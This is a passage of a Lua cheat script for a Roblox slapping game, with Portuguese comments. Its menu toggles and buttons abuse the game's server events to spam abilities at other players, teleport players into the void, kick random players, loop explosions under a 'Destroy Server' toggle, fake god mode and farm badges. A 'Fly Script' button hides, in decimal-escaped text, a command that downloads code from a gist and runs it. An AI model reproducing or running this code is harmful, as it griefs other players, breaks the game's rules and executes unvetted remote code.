    local allPlayers = Players:GetPlayers()
    local randomPlayer = allPlayers[math.random(1, #allPlayers)]

    local args = {
        [1] = "Ability3",
        [2] = randomPlayer
    }

    ReplicatedStorage:WaitForChild("GeneralAbility"):FireServer(unpack(args))

    -- Esperar 1.7 segundos antes da próxima iteração
    wait(2)
  end
end    
})

TabTrolling:AddToggle({
        Name = "Null Spam",
        Default = false,
        Callback = function(Value)
_G.nullSpam = Value
while _G.nullSpam do
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer() 
task.wait(10)
          end
        end    
})

TabTrolling:AddToggle({
        Name = "Spam Error Sound",
        Default = false,
        Callback = function(Value)
_G.errorSound = Value
while _G.errorSound do
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer() 
task.wait(2)
  end
end 
})



TabTrolling:AddToggle({
	Name = "Rhythm Explosion",
	Default = false,
	Callback = function(Value)
	_G.RhythmEx = Value
while _G.RhythmEx do
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
task.wait(0.5)
  end
end    
})




TabMisc:AddToggle({
    Name = "Auto Collect Slapple",
    Default = false,
    Callback = function(Value)
        _G.SlappleFarm = Value

        local function loop1()
            while _G.SlappleFarm do
                -- Encontre todos os Slapples na arena
                local slapples = workspace.Arena:GetDescendants()
                for _, slapple in ipairs(slapples) do
                    if slapple.Name == "Slapple" then
                        -- Encontre todos os TouchTransmitters dentro de cada Slapple
                        local touchTransmitters = slapple:GetDescendants()
                        for _, transmitter in ipairs(touchTransmitters) do
                            if transmitter:IsA("TouchTransmitter") then
                                -- Acione o FireTouchInterest para cada TouchTransmitter encontrado
                                firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), transmitter.Parent, 0)
                            end
                        end
                    end
                end
                wait(0.1)
            end
        end

        local function loop2()
            while _G.SlappleFarm do
                -- Encontre o GoldenSlapple dentro de Slapples em island5 em workspace.Arena
                local goldenSlapple = workspace.Arena.island5.Slapples:FindFirstChild("GoldenSlapple")
                if goldenSlapple then
                    -- Encontre todos os TouchTransmitters dentro do GoldenSlapple
                    local touchTransmitters = goldenSlapple:GetDescendants()
                    for _, transmitter in ipairs(touchTransmitters) do
                        if transmitter:IsA("TouchTransmitter") then
                            -- Acione o FireTouchInterest para cada TouchTransmitter encontrado
                            firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), transmitter.Parent, 0)
                        end
                    end
                end
                wait(0.1)
            end
        end

        if _G.SlappleFarm then
            spawn(loop1)
            spawn(loop2)
        end
    end
})

TabMisc:AddButton({
  Name = "Get Radio (Fake)",
  Callback = function()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

local function giveRadioTool()
    local radioTool = ReplicatedStorage:FindFirstChild("Radio")
    
    if radioTool then

        local toolClone = radioTool:Clone()
        
        toolClone.Parent = player:WaitForChild("Backpack")
    else
        warn("Error getting fake radio.")
    end
end

giveRadioTool()
    end
})
TabMisc:AddButton({
        Name = "GodMode ",
        Callback = function()
if game.Players.LocalPlayer.Character:FindFirstChild("entered") then
  OrionLib:MakeNotification({
    Name = "Ops",
    Content = "You need to be in the Lobby.",
    Image = "rbxassetid://17748409757",
    Time = 5
})
else
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1, 0)
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1, 1)
wait(0.1)
repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or game.Players.LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool")
for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v.ClassName == "Tool" then
                        v.Parent = game.LogService
                    end
                end
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        v.Parent = game.LogService
                end
game:GetService("ReplicatedStorage"):WaitForChild("HumanoidDied"):FireServer(game.Players.LocalPlayer.Character,false)
wait(3.75)
for i,v in pairs(game.LogService:GetChildren()) do
                        v.Parent = game.Players.LocalPlayer.Backpack
                end
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                        game.Players.LocalPlayer.Character.Humanoid:EquipTool(v)
                end 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Origo.CFrame * CFrame.new(0,-5,0)
   end
end
})


TabTeleports:AddButton({
        Name = "Teleport To Plate",
        Callback = function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.workspace.Arena.Plate.CFrame
          end    
})

TabImmunity:AddToggle({
  Name = "Anti-Ragdoll",
  Default = false,
  Callback = function(Value)
    AntiRagdoll = Value
    -- Get reference to the local player and their character
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer

-- Function to anchor the head for a given number of seconds
local function anchorHeadForSeconds(head, seconds)
    head.Anchored = true
    wait(seconds)
    head.Anchored = false
end

-- Function to monitor the Ragdolled property
local function monitorRagdolled()
    local character = player.Character or player.CharacterAdded:Wait()
    local head = character:WaitForChild("Head")
    local ragdolled = workspace:WaitForChild(player.Name):WaitForChild("Ragdolled")

    while AntiRagdoll do
        -- Check the Ragdolled property
        if ragdolled.Value then
            anchorHeadForSeconds(head, 2.6)
            -- Wait until the Ragdolled property is no longer true before checking again
            repeat
                wait()
            until not ragdolled.Value
        else
            -- If not ragdolled, wait a short time before checking again
            wait(0.1)
        end
    end
end

-- Initialize monitoring when the character is available
if player.Character then
    monitorRagdolled()
end

player.CharacterAdded:Connect(function()
    monitorRagdolled()
end)
end
})
TabBadges:AddToggle({
        Name = "Brick Farm",
        Default = false,
        Callback = function(Value)
_G.BrickFarm = Value 
while _G.BrickFarm do
game:GetService("VirtualInputManager"):SendKeyEvent(true,"E",false,x)
task.wait(1)
  end
end
})

TabBadges:AddButton({
  Name = "Fast Brick Farm",
  Callback = function()
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" and game.Players.LocalPlayer.Character:FindFirstChild("entered") then
local jogador = game.Players.LocalPlayer
  local destinoCFrame = CFrame.new(5597.26465, 181.799469, -146.706467, -0.435461491, 0.00667448156, 0.900182664, -1.16910187e-05, 0.999972463, -0.00742003508, -0.9002074, -0.00324165984, -0.435449421)
jogador.Character:SetPrimaryPartCFrame(destinoCFrame)
wait(0.5)
    for i = 1, 1000 do
 game:GetService("ReplicatedStorage"):WaitForChild("lbrick"):FireServer()

      local player = game.Players.LocalPlayer
local textLabel = player:WaitForChild("PlayerGui"):WaitForChild("BRICKCOUNT"):WaitForChild("ImageLabel"):WaitForChild("TextLabel")
local currentText = tonumber(textLabel.Text)
if currentText then
    textLabel.Text = tostring(currentText + 1)
else
    warn("O texto atual não é um número válido.")
end
wait(1.6)
  end
else
  OrionLib:MakeNotification({
	Name = "Ops",
	Content = "You did not equip Brick or Joined the Arena",
	Image = "rbxassetid://17748409757",
	Time = 5
})
end
end
})



TabTrolling:AddButton({
    Name = "Kick Random Player",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Recall" then
            local position = CFrame.new(-732.574097, 306.27005, -1.09629261, -0.0223243386, 0.0153695755, -0.999632657, -2.04585031e-05, 0.999881864, 0.0153738642, 0.999750793, 0.000363676081, -0.0223213844)
            local transparency = 1

            local part = Instance.new("Part")
            part.Size = Vector3.new(100, 1.5, 100)
            part.Position = position.p
            part.Anchored = true
            part.Transparency = transparency
            part.Parent = game.Workspace
            wait(2)
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            local newCFrame = CFrame.new(-723.266052, 310.018982, -0.0775156692, -0.473462105, -9.27528063e-08, -0.880814195, -2.28346426e-08, 1, -9.30292359e-08, 0.880814195, -2.39327402e-08, -0.473462105)

            humanoid.RootPart.CFrame = newCFrame
            wait(0.5)
            local args = {
                [1] = game:GetService("Players").LocalPlayer.Character.Recall,
                [2] = Vector3.new(55.76399230957031, -5.172937870025635, 45.26799011230469)
            }

            game:GetService("ReplicatedStorage"):WaitForChild("Recall"):InvokeServer(unpack(args))

            wait(2.4)

            local function GetRandomPlayer()
                local players = game.Players:GetPlayers()
                local randomIndex = math.random(1, #players)
                return players[randomIndex]
            end

            local function TeleportTeleportToRandomPlayer(player)
                local randomPlayer = GetRandomPlayer()
                if randomPlayer then
                    player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
                else
                    OrionLib:MakeNotification({
                        Name = "Ops",
                        Content = "You need to equip recall and hold the glove first.",
                        Image = "rbxassetid://17748409757",
                        Time = 5
                    })
              end
            end
        end
       end
})

local PlayerCountingEl = TabBadges:AddLabel("Players in the server: " .. #game.Players:GetPlayers())

TabBadges:AddDropdown({
        Name = "Elude Keypad",
        Default = "1",
        Options = {"1 Player", "2 Players", "3 Players", "4 Players", "5 Players", "6 Players", "7 Players", "8 Players", "9 Players", "10 Players", "11 Players", "12 Players", "13 Players", "14 Players" ,"15 Players" , "16 Players"},
        Callback = function(Value)
if Value == "1 Player" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "2 Players" then 
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "3 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["6"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "4 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["9"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "5 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["2"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "6 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["2"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "7 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["2"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["6"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "8 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["2"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["9"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "9 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "10 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "11 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["6"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "12 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["9"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "13 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "14 Players" then
fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "15 Players" then
  fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["6"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["8"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
elseif Value == "16 Players" then
  fireclickdetector(workspace.Keypad.Buttons["1"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["4"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["9"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["3"].ClickDetector)
wait(0.5)
fireclickdetector(workspace.Keypad.Buttons["Enter"].ClickDetector)
  end
end    
})


TabTeleports:AddDropdown({
    Name = "Teleports",
    Default = "Choose A Place",
    Options = {"Choose A Place", "Arena", "Slapple", "Cannon", "Lobby", "Default Island", "Tournament"},
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        if Value == "Arena" then 
            local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
        elseif Value == "Slapple" then
            local cframe = CFrame.new(-392.199005, 52.260437, -11.50669, -0.0686506107, 0.0031023256, -0.99763602, -5.76306866e-06, 0.999995291, 0.00311006, 0.997640789, 0.000219268302, -0.0686502606)
            character:SetPrimaryPartCFrame(cframe)
        elseif Value == "Choose A Place" then
            print("Teleports Loaded.")
        elseif Value == "Cannon" then
            local cframe = CFrame.new(263.296326, 35.1829185, 195.506088, 0.648741186, -0.00185392145, 0.761006892, -3.16862497e-06, 0.99999702, 0.00243883952, -0.761009097, -0.00158458925, 0.648739219)
            character:SetPrimaryPartCFrame(cframe)
        elseif Value == "Lobby" then
            local cframe = CFrame.new(-795.934753, 329.274933, -1.03634119, 0.148197666, 0.00229916582, -0.988955081, -2.76089145e-06, 0.999997318, 0.00232442468, 0.988957763, -0.00034175007, 0.148197278)
            character:SetPrimaryPartCFrame(cframe)
        elseif Value == "Default Island" then
            local cframe = CFrame.new(131.374573, 361.482452, -6.89128542, -0.945504069, -0.000790083141, -0.325609207, -8.7355096e-07, 0.999997079, -0.00242393324, 0.325610131, -0.00229155412, -0.945501328)
            character:SetPrimaryPartCFrame(cframe)
         elseif Value == "Tournament" then
            local cframe = CFrame.new(3417.19458, 83.9930954, 2.8145473, -0.103299014, -0.00704767602, -0.99462539, -1.18029084e-05, 0.999975026, -0.00708435476, 0.994650424, -0.000720054784, -0.103296511)
            character:SetPrimaryPartCFrame(cframe)
        end
    end
})


TabTrolling:AddButton({
	Name = "Tp Player to Void",
	Callback = function()
local position = CFrame.new(3269.08154, -49616.5977, 3432.50122, 0.610011876, -0.266344607, -0.74628818, -0.0209113024, 0.936077535, -0.351171732, 0.792116284, 0.229824781, 0.565448761)
local transparency = 1

local part = Instance.new("Part")
part.Size = Vector3.new(100, 1.5, 100) -- Tamanho da plataforma
part.Position = position.p -- Posição da plataforma
part.Anchored = true -- A plataforma está ancorada
part.Transparency = transparency -- Definir transparência
part.Parent = game.Workspace -- Colocar a plataforma no espaço de trabalho
wait(0.3)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local newCFrame = CFrame.new(3269.08154, -49616.5977, 3432.50122, 0.610011876, -0.266344607, -0.74628818, -0.0209113024, 0.936077535, -0.351171732, 0.792116284, 0.229824781, 0.565448761)

humanoid.RootPart.CFrame = newCFrame
wait(0.5)
game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()
wait(1)
OrionLib:MakeNotification({
	Name = "Done",
	Content = "Player got teleported to void. Wait until he leaves or you will get trapped.",
	Image = "rbxassetid://17748409757",
	Time = 5
})

end    
})

TabBadges:AddButton({
	Name = "Get Brazil Badge",
	Callback = function()
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.brazil.portal.TouchInterest.Parent, 0)
end    
})


TabBadges:AddButton({
	Name = "Get Orange Badge",
	Callback = function()
fireclickdetector(workspace.Arena.island5["Orange"].ClickDetector)
end   
})


TabTrolling:AddButton({
        Name = " Teleport Player to Tournament",
        Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(3417.19458, 83.9930954, 2.8145473, -0.103299014, -0.00704767602, -0.99462539, -1.18029084e-05, 0.999975026, -0.00708435476, 0.994650424, -0.000720054784, -0.103296511)

character:SetPrimaryPartCFrame(cframe)
wait(0.5)
game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()
wait(1)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(3417.19458, 83.9930954, 2.8145473, -0.103299014, -0.00704767602, -0.99462539, -1.18029084e-05, 0.999975026, -0.00708435476, 0.994650424, -0.000720054784, -0.103296511)

character:SetPrimaryPartCFrame(cframe)
wait(0.5)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer() 
end    
})

TabTrolling:AddButton({
	Name = "Bring Player to Hunter Arena",
	Callback = function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(17896.1797, -128.664368, -3544.22412, -0.999756634, -0.000100836049, -0.0220624395, -3.8296148e-06, 0.999990463, -0.00439669611, 0.0220626704, -0.00439554127, -0.999746978)

character:SetPrimaryPartCFrame(cframe)
wait(1)
game:GetService("ReplicatedStorage"):WaitForChild("SLOC"):FireServer()

  end    
})



TabMain:AddButton({
	Name = "Fly Script (Made by me_ozone)",
	Callback = function()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end    
})


TabTeleports:AddButton({
	Name = "No Oneshot Gamemode",
	Callback = function()
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport3.TouchInterest.Parent, 0)
end    
})


TabTeleports:AddButton({
	Name = "Join Arena ",
	Callback = function()
firetouchinterest(game.Players.LocalPlayer.Character:WaitForChild("Head"), workspace.Lobby.Teleport1.TouchInterest.Parent, 0)
end    
})


TabTrolling:AddButton({
	Name = "Freeze Random ",
	Callback = function()
if game.Players.LocalPlayer.leaderstats.Glove.Value == "Frostbite" then
local function GetRandomPlayer()
    local players = game.Players:GetPlayers()
    local randomIndex = math.random(1, #players)
    return players[randomIndex]
end

-- Função para ar um jogador para outro jogador aleatório
local function TeleportToRandomPlayer(player)
    local randomPlayer = GetRandomPlayer()
    if randomPlayer then
        player.Character:SetPrimaryPartCFrame(randomPlayer.Character.PrimaryPart.CFrame)
    else
        print("Nenhum jogador disponível para ar.")
    end
end

-- ar o jogador para uma pessoa aleatória quando o script é executado
local player = game.Players.LocalPlayer
if player then
    TeleportToRandomPlayer(player)
else
    print("Não foi possível encontrar o jogador local.")
end
wait(0.2)
local args = {
    [1] = 0.013125000614672899
}

game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))

wait(1)
            local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
else
       OrionLib:MakeNotification({
                    Name = "Ops",
                    Content = "You need to equip frostbite",
                    Image = "rbxassetid://17748409757",
                    Time = 5
                })   
  end
end    
})


TabTrolling:AddToggle({
	Name = "Destroy Server",
	Default = false,
	Callback = function(Value)
DestroyServer = Value
while DestroyServer do
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(40.6329346, -3.69798946, 17.1903038, 0.172667935, -0.0038329165, 0.984972656, -1.42282324e-05, 0.99999243, 0.00389386038, -0.984980106, -0.00068636972, 0.172666565)
            character:SetPrimaryPartCFrame(cframe)
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
  wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-392.199005, 52.260437, -11.50669, -0.0686506107, 0.0031023256, -0.99763602, -5.76306866e-06, 0.999995291, 0.00311006, 0.997640789, 0.000219268302, -0.0686502606)
            character:SetPrimaryPartCFrame(cframe)
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(263.296326, 35.1829185, 195.506088, 0.648741186, -0.00185392145, 0.761006892, -3.16862497e-06, 0.99999702, 0.00243883952, -0.761009097, -0.00158458925, 0.648739219)
            character:SetPrimaryPartCFrame(cframe)
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(131.374573, 361.482452, -6.89128542, -0.945504069, -0.000790083141, -0.325609207, -8.7355096e-07, 0.999997079, -0.00242393324, 0.325610131, -0.00229155412, -0.945501328)
            character:SetPrimaryPartCFrame(cframe)
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(3417.19458, 83.9930954, 2.8145473, -0.103299014, -0.00704767602, -0.99462539, -1.18029084e-05, 0.999975026, -0.00708435476, 0.994650424, -0.000720054784, -0.103296511)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
 local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-4.41874456, -3.65609717, -177.127335, 0.530886769, -0.00534344791, -0.847425938, -9.22042273e-06, 0.999980092, -0.00631115772, 0.847442806, 0.00335832662, 0.53087616)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(35.4321899, -3.67293763, -81.2292862, -0.673177004, 0, -0.739481449, 0, 1.00000012, 0, 0.739481449, 0, -0.673177004)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(65.8015289, -3.67313337, -5.45897055, -0.924592316, 0.000140136486, -0.380958259, -2.02335315e-07, 0.99999994, 0.000368396344, 0.380958319, 0.000340701692, -0.924592137)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-96.9768829, -3.68479776, -15.548563, -0.561696172, 0.00527838478, 0.827326775, -9.48045999e-06, 0.999979615, -0.00638634898, -0.827343583, -0.00359502505, -0.561684668)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local cframe = CFrame.new(-212.338409, -3.80755782, -1.79173529, -0.436284453, 0.00210061227, -0.899806321, -7.24073197e-06, 0.999997258, 0.00233800872, 0.899808824, 0.00102653052, -0.436283261)

character:SetPrimaryPartCFrame(cframe) 
wait(0.2)
game:GetService("ReplicatedStorage").rhythmevent:FireServer("AoeExplosion",0)
wait(0.2)
game:GetService("ReplicatedStorage"):WaitForChild("NullAbility"):FireServer()
wait(0.2)
  game:GetService("ReplicatedStorage"):WaitForChild("ErrorDeath"):FireServer()
wait(0.5)
local player = game.Players.LocalPlayer
